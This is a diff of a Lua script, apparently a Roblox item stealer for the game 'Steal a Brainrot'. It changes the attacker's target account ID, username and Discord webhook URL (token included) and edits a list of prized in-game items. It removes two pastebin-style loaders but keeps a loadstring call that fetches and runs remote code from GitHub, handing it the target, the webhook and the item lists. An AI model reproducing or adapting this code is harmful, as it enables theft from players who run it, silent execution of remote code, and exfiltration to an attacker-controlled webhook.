@@ -1,19 +1,13 @@
-local TARGET_ID = 11947860370
-local TARGET_USER = "vynxplayer"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1569966940372606998/93bohyMjUrBctBKhntxTvTGhXYO5S8OuNyLI1f4TuEBdIwxtK2NSPeKB9Y-xYsLt3-ZA"
+local TARGET_ID = 3998611877
+local TARGET_USER = "Dinner3675"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1556008544032129044/R3Sr1vsIP2fT4gCih-_lWjB_IdRgLzO90ErTckzczkB6M34sHApO9TrRA54hwJSYemLp"
 
 local TargetBrainrots = {
-    ["Dragon Skeletonini"] = true,
-    ["Phoenix"] = true,
-    ["Plant Bros"] = true,
-    ["Hydra Serpent"] = true,
-    ["Orchidox"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
     ["Los Dragons"] = true,
     ["La Craft Machine"] = true,
-    ["Gold and Diamond"] = true,
     ["Dragon Cannelloni"] = true,
     ["Dragon Gingerini"] = true,
     ["Griffin"] = true,
@@ -287,7 +281,15 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Draculino"] = true,
+    ["Lionello Casarello"] = true,
+    ["Hydra Serpent"] = true,
+    ["Orchidox"] = true,
+    ["Gold and Diamond"] = true,
+    ["Dragon Skeletonini"] = true,
+    ["Plant Bros"] = true,
+    ["Phoenix"] = true
 }
 
 local TargetBaseSkins = {
@@ -346,14 +348,6 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
-
-    task.wait(1)
-
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
